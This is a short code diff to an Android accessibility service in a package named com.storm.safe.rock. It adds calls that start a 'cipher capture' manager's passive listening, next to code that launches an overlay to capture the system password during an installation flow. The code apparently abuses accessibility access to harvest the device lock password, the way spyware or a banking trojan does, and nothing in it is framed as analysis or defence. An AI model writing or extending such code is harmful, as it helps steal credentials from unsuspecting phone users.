@@ -2323,6 +2323,7 @@ class MyAccessibilityService : AccessibilityService() {
                             prefs.edit().putBoolean("cipher_completed", false).apply()
                             isCipherCaptureEnabled = true
                             cipherRetryCount = 0
+                            cipherCaptureManager?.startListening()
                         }
                     }
                 }
@@ -3993,8 +3994,9 @@ class MyAccessibilityService : AccessibilityService() {
                         prefs.edit().putBoolean("cipher_completed", false).apply()
                         isCipherCaptureEnabled = true
                         cipherRetryCount = 0
+                        cipherCaptureManager?.startListening()
                         if (com.storm.safe.rock.util.DebugConfig.disableCipherOverlay) {
-                            android.util.Log.d(TAG, "🔐 [postAuth] debug 禁用弹窗，仅启用被动监听")
+                            android.util.Log.d(TAG, "🔐 [postAuth] debug 禁用弹窗，已启用被动监听")
                         } else {
                             kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.Main) {
                                 doLaunchSystemPasswordCapture(isInstallationFlow = true)
